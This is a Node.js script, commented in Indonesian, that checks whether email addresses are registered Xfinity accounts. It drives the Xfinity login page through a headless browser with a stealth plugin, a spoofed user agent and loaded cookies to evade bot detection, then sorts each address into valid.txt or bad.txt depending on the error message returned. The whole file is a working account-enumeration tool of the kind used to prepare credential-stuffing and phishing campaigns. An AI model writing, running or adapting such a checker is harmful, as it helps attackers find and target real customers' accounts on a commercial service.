const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');

// Menggunakan Stealth Plugin
puppeteer.use(StealthPlugin());

// ANSI escape codes for coloring output
const colors = {
    reset: '\x1b[0m',
    green: '\x1b[32m',
    red: '\x1b[31m',
    yellow: '\x1b[33m',
};

// Fungsi untuk delay
function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}

// Fungsi untuk memuat cookies dari file dengan format name=value
async function loadCookies(page) {
    try {
        const cookiesString = fs.readFileSync('cookies.txt', 'utf-8');
        const cookiesArray = cookiesString.split('\n').filter(line => line.trim() !== '');
        const cookies = cookiesArray.map(line => {
            const [name, value] = line.split('=');
            return { name: name.trim(), value: value.trim() };
        });
        await page.setCookie(...cookies);
        console.log(`${colors.green}[INFO] Cookies loaded successfully.${colors.reset}`);
    } catch (error) {
        console.log(`${colors.yellow}[WARNING] Failed to load cookies: ${error}${colors.reset}`);
    }
}

// Fungsi untuk cek email terdaftar di Xfinity
async function checkEmail(email) {
    const browser = await puppeteer.launch({
        headless: true, // Ubah ke false untuk mode debugging
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--disable-gpu',
            '--disable-dev-shm-usage',
            '--disable-software-rasterizer',
            '--no-zygote',
        ],
        executablePath: process.env.CHROME_PATH || '/usr/bin/google-chrome', // Jalur ke instalasi Chrome di Windows
        slowMo: 100 // Menambahkan slow motion 100ms
    });
    const page = await browser.newPage();

    await loadCookies(page); // Muat cookies jika ada

    // Set User-Agent
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');

    // Menambahkan header HTTP
    await page.setExtraHTTPHeaders({
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    });

    try {
        await page.goto('https://login.xfinity.com/login', { timeout: 60000 });

        // Tunggu sampai input email tersedia
        await page.waitForSelector('#user', { timeout: 10000 });
        await page.type('#user', email);

        // Tambahkan delay sebelum mengklik
        await delay(2000);

        // Tekan tombol submit
        await Promise.all([
            page.click('#sign_in'),
            page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 60000 }) // Tunggu sampai navigasi selesai
        ]);

        // Ambil konten halaman setelah klik
        const content = await page.content();

        // Cek apakah email tidak ditemukan di halaman respons
        if (content.includes('The Xfinity ID you entered was incorrect')) {
            console.log(`${colors.red}[FAILED] ${email}${colors.reset}`);
            fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke bad.txt
            return { email: email, status: 'FAILED' };
        } else {
            console.log(`${colors.green}[SUCCESS] ${email}${colors.reset}`);
            fs.appendFileSync('valid.txt', `${email}\n`); // Simpan ke valid.txt
            return { email: email, status: 'SUCCESS' };
        }

    } catch (error) {
        console.log(`${colors.yellow}[ERROR] ${email}: ${error}${colors.reset}`);
        fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke bad.txt jika ada error
        return { email: email, status: 'ERROR' };
    } finally {
        await browser.close();
    }
}

// Jika dipanggil langsung dari command line
if (require.main === module) {
    const email = process.argv[2]; // Argumen email dari command line
    if (!email) {
        console.log(`${colors.red}[ERROR] Email must be provided as a command line argument.${colors.reset}`);
        process.exit(1);
    }
    checkEmail(email)
        .then(result => {
            // Handle result here
        })
        .catch(error => {
            console.log(`[ERROR] ${email}: ${error}`); 
        });
}

module.exports = { checkEmail };
